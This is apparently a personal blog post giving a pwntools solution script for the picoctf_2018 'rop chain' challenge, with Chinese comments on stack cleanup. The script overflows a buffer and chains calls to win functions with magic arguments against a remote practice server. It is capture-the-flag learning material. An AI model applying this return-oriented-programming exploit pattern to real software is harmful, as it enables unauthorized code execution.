+++
title = "exp and wp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['第一页', 'picoctf_2018_rop chain']
draft = false
+++
```python
from pwn import *  
  
local_file = './PicoCTF_2018_rop_chain'  
  
select = 1  
if select == 0:  
    r = process(local_file)  
else:  
    r = remote('node5.buuoj.cn', 28015)  
elf = ELF(local_file)  
context.log_level = 'debug'  
  
flag = 0x0804862B  
win1=elf.sym['win_function1']  
win2 = 0x080485D8  
pop = 0x0804840d  
#win2传入一个参数为-1163220307，运行完后win1=win2=1  
#flag传入一个参数为-559039827，运行完后会输出flag  
#+p32(pop)  
payload=b'a'*(0x18+4)+p32(win1)+p32(win2)+p32(pop)+p32(0xBAAAAAAD)+p32(flag)+p32(pop)+p32(0xDEADBAAD)  
#payload='a'*(0x18+4)+p32(win1)+p32(win2)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)
每个函数之后都要清理一次栈，因为参数是始终在栈顶的
pop 一个没鸟用的寄存器
pop 位置在函数和第一个参数之间
这个题还有一种写法是函数先写，再逐个传参
即函数+函数+函数+参数+参数+参数
没参数的忽略参数


r.sendline(payload)  
r.interactive()
```
